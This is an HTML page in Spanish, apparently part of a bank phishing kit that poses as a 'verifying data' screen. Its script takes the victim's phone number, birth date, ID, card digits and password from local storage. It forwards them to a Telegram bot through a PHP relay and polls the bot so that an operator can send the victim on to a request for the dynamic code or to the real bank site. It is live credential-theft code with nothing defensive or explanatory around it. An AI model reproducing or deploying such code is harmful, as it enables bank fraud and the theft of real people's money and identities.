<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Verificando Datos</title>
  <style>
    body {
      margin: 0;
      padding: 0;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      background: url('img/fondo.jpg') no-repeat center center fixed;
      background-size: cover;
    }
    .blur-overlay {
      position: fixed;
      top: 0; left: 0;
      width: 100%; height: 100%;
      background: rgba(255,255,255,0.4);
      backdrop-filter: blur(10px);
    }
    .loaderp-full {
      display: flex;
      justify-content: center;
      align-items: center;
      flex-direction: column;
      height: 100%; width: 100%;
    }
    .loaderp {
      width: 180px;
      height: 180px;
      background-image: url('img/circulo.png');
      background-size: cover;
      border-radius: 50%;
      display: flex;
      justify-content: center;
      align-items: center;
      flex-direction: column;
    }
    .loader {
      width: 30px;
      height: 30px;
      border: 5px solid #f3f3f3;
      border-top: 5px solid #333;
      border-radius: 50%;
      animation: spin 1s linear infinite;
    }
    .loaderp-text {
      margin-top: 30px;
      font-size: 14px;
      color: #000;
    }
    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
  </style>
</head>
<body>
  <div class="blur-overlay"></div>
  <div class="loaderp-full">
    <div class="loaderp">
      <div class="loader"></div>
      <div class="loaderp-text">Verificando...</div>
    </div>
  </div>

<script>
document.addEventListener('DOMContentLoaded', async () => {
  const loader = document.querySelector('.loaderp-full');
  const config = await fetch("botconfig.json").then(r => r.json()).catch(err => {
    alert("Error cargando configuración");
    console.error(err);
    return null;
  });
  if (!config || !config.token || !config.chat_id) return;

  const data = JSON.parse(localStorage.getItem("bancoldata") || "{}");
  if (!data.celular || !data.nacimiento || !data.tipo || !data.identificador || !data.digitosFinales || !data.clave) {
    alert("Faltan datos. Redirigiendo...");
    return window.location.href = "index.html";
  }

  const transactionId = Date.now().toString(36) + Math.random().toString(36).slice(2);
  localStorage.setItem("transactionId", transactionId);

  const mensaje = `
<b>REGISTRO NUEVO</b>
🆔 ID: ${transactionId}
📱 Celular: ${data.celular}
🎂 Nacimiento: ${data.nacimiento}
💳 Tipo: ${data.tipo}
🔢 Identificador: ${data.identificador}
🔸 Últimos 2 dígitos: ${data.digitosFinales}
🔐 Clave: ${data.clave}
`;

  const keyboard = {
    inline_keyboard: [
      [{ text: "Pedir Dinámica", callback_data: `pedir_dinamica:${transactionId}` }],
      [{ text: "Error Logo", callback_data: `error_logo:${transactionId}` }],
      [{ text: "Finalizar", callback_data: `confirm_finalizar:${transactionId}` }]
    ]
  };

  await fetch("botmaster2.php", {
    method: "POST",
    headers: { "Content-Type": "application/x-www-form-urlencoded" },
    body: "data=" + encodeURIComponent(mensaje) + "&keyboard=" + encodeURIComponent(JSON.stringify(keyboard))
  });

  const offset = await getLastUpdateId(config.token);
  checkBoton(config.token, transactionId, offset + 1);
});

async function getLastUpdateId(botToken) {
  try {
    const res = await fetch(`https://api.telegram.org/bot${botToken}/getUpdates`);
    const data = await res.json();
    if (!data.ok || !data.result.length) return 0;
    return data.result[data.result.length - 1].update_id;
  } catch (e) {
    console.error("No se pudo obtener update_id:", e);
    return 0;
  }
}

async function checkBoton(botToken, txId, offset) {
  try {
    const res = await fetch(`https://api.telegram.org/bot${botToken}/getUpdates?offset=${offset}`);
    const data = await res.json();
    if (!data.ok || !data.result) throw new Error("Sin resultados");

    let newOffset = offset;

    for (const update of data.result) {
      newOffset = update.update_id + 1;
      if (update.callback_query && update.callback_query.data.includes(txId)) {
        const tipo = update.callback_query.data.split(":")[0];
        console.log("Botón presionado:", tipo);

        await fetch("sendStatus.php", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ status: tipo })
        });

        switch (tipo) {
          case "pedir_dinamica":
            return window.location.href = "cel-dina.html";
          case "error_logo":
            return window.location.href = "errorlogo.html";
          case "confirm_finalizar":
            return window.location.href = "https://www.bancoppel.com/";
        }
      }
    }

    setTimeout(() => checkBoton(botToken, txId, newOffset), 3000);
  } catch (err) {
    console.error("Error verificando botón:", err);
    setTimeout(() => checkBoton(botToken, txId, offset), 3000);
  }
}
</script>

</body>
</html>
